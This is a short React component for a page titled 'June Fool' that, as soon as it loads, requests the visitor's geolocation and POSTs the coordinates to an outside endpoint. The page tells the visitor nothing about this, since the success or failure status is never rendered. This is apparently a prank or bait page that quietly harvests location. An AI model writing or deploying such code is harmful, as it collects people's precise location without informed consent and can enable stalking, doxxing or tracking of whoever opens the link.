import { useEffect, useState } from 'react';

const ENDPOINT = 'https://temp25.vercel.app/location';

function App() {
  const [status, setStatus] = useState('Loading...');
  const [isSending, setIsSending] = useState(false);

  useEffect(() => {
    if (!navigator.geolocation) {
      setStatus('Geolocation is not supported.');
      return;
    }

    setIsSending(true);
    navigator.geolocation.getCurrentPosition(
      async (position) => {
        const payload = {
          latitude: position.coords.latitude,
          longitude: position.coords.longitude
        };

        try {
          const response = await fetch(ENDPOINT, {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json'
            },
            body: JSON.stringify(payload)
          });

          if (!response.ok) {
            throw new Error(`Server returned ${response.status}`);
          }

          const data = await response.json();
          setStatus('Location sent successfully');
          console.log('Server response:', data);
        } catch (error) {
          console.error(error);
          setStatus('Failed to send location');
        } finally {
          setIsSending(false);
        }
      },
      () => {
        setStatus('Location permission denied.');
        setIsSending(false);
      }
    );
  }, []);

  return (
    <main className="app-shell">
      <section className="card">
        <h1>June Fool</h1>
        
      </section>
    </main>
  );
}

export default App;
